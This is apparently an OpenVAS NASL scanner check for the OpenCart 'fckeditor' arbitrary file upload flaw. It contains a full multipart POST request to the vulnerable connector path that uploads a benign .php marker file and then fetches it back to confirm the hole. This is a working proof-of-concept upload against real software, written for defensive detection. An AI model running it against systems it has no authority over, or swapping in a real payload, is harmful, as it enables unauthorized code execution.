###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_opencart_43325.nasl 14 2013-10-27 12:33:37Z jan $
#
# OpenCart 'fckeditor' Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "OpenCart is prone to an arbitrary-file-upload vulnerability because it
fails to properly sanitize user-supplied input.

An attacker may leverage this issue to upload arbitrary files to the
affected computer; this can result in arbitrary code execution within
the context of the vulnerable application.

OpenCart 1.4.9.1 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100816);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-09-21 16:24:40 +0200 (Tue, 21 Sep 2010)");
 script_bugtraq_id(43325);
 script_tag(name:"cvss_base", value:"4.6");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
 script_name("OpenCart 'fckeditor' Arbitrary File Upload Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/43325");
 script_xref(name : "URL" , value : "http://www.opencart.com");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if OpenCart is prone to an arbitrary-file-upload vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("opencart_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port, app:"opencart"))exit(0);

file = string("openvas-upload-test-delete-me-",rand(),".php");
url = string(dir,"/admin/view/javascript/fckeditor/editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=%2F"); 

req = string("POST ", url, " HTTP/1.1\r\n",
	     "Host: ", get_host_name(),"\r\n",
	     "User-Agent: Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.10) Gecko/20100914 OpenVAS\r\n",
	     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
	     "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
	     "Accept-Encoding: gzip,deflate\r\n",
	     "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
	     "Keep-Alive: 115\r\n",
	     "Connection: keep-alive\r\n",
	     "Referer: http://",get_host_name(),"/",dir,"//admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html\r\n",
             "Content-Type: multipart/form-data; boundary=---------------------------1179981022663023650735134601\r\n",								      
	     "Content-Length: 275\r\n",
	     "\r\n",
	     "-----------------------------1179981022663023650735134601\r\n",
	     "Content-Disposition: form-data; name='NewFile'; filename='",file,"'\r\n",
	     "Content-Type: text/plain\r\n",
	     "\r\n",
	     "OpenVAS-Upload-Test\r\n",
	     "\r\n",
	     "-----------------------------1179981022663023650735134601--\r\n",
	     "\r\n\r\n");

recv = http_keepalive_send_recv(data:req, port:port, bodyonly:FALSE);

if("OnUploadCompleted" >< recv && file >< recv) {

  url = string(dir,"/admin/view/javascript/fckeditor/editor/filemanager/connectors/php/",file);
  req2 = http_get(item:url, port:port);
  recv = http_keepalive_send_recv(data:req2, port:port, bodyonly:FALSE);

  if("OpenVAS-Upload-Test" >< recv) {
    security_hole(port:port);
    exit(0);
  }  
}  

exit(0);
